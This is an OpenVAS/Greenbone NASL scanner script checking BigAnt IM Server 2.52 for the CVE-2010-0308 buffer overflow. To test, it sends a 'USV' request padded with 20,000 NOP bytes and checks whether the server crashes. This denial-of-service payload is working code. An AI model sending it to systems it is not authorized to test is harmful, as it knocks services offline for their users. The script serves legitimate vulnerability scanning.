# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:bigantsoft:bigant_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100413");
  script_version("2025-02-19T05:37:55+0000");
  script_tag(name:"last_modification", value:"2025-02-19 05:37:55 +0000 (Wed, 19 Feb 2025)");
  script_tag(name:"creation_date", value:"2010-01-04 18:09:12 +0100 (Mon, 04 Jan 2010)");
  script_tag(name:"cvss_base", value:"4.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:N/I:N/A:P");

  script_cve_id("CVE-2010-0308");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("BigAnt IM Server 'USV' Request Buffer Overflow Vulnerability - Active Check");

  script_category(ACT_DENIAL);

  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Buffer overflow");
  script_dependencies("gb_bigant_server_http_detect.nasl");
  script_require_ports("Services/www", 6660);
  script_mandatory_keys("bigant/server/detected");

  script_tag(name:"summary", value:"BigAnt IM Server is prone to a remote buffer overflow
  vulnerability because it fails to perform adequate boundary checks on user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted USV request and checks if the server is still
  responding afterwards.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary code
  with the privileges of the user running the server. Failed exploit attempts will result in a
  denial-of-service condition.");

  script_tag(name:"affected", value:"BigAnt IM Server version 2.52 is vulnerable. Other versions
  may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/37520");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

banner = http_get_remote_headers(port: port);

if (banner !~ "Server\s*:\s*AntServer")
  exit(0);

if (http_is_dead(port: port))
  exit(0);

if (!soc = open_sock_tcp(port))
  exit(0);

payload = crap(data: raw_string(0x90), length: 20000);

req = string("USV ", payload, "\r\n\r\n");

send(socket: soc, data: req);
sleep(5);

if (http_is_dead(port: port)) {
  security_message(port:port);
  exit(0);
}

exit(99);
